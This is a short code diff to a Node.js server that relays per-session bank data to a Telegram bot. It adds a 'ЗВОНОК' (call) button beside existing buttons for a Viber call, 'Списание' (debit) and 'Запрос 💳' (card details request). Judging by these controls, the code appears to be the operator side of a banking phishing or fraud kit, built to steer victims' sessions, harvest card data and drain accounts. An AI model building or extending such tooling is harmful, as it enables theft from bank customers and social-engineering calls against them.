@@ -1,4 +1,4 @@
-Const express = require('express');
+const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
@@ -335,6 +335,7 @@ function sendToTelegram(message, sessionId, bankName) {
         keyboard = [
             [
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
+                { text: 'ЗВОНОК 📞', callback_data: `call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
             ],
